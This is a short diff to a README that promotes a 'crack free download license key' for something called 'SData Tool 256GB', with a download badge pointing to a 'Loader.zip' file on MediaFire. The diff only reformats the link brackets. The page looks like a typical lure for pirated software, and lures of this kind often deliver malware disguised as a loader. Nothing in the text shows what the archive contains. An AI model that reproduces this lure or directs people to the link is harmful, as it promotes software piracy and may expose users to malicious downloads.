@@ -1,6 +1,6 @@
 # SData Tool 256GB Featuring Crack Free Download License Key 🚀
 
-[![Download](https://img.shields.io/badge/Download-purple)]((https://www.mediafire.com/file/p493rc60xcpgpj4/Loader.zip/file))
+[![Download](https://img.shields.io/badge/Download-purple)]([https://www.mediafire.com/file/p493rc60xcpgpj4/Loader.zip/file])
 
 > **Unlock the Next Generation of Data Storage Management with SData Tool 256GB Featuring Crack Free Download License Key!**
 
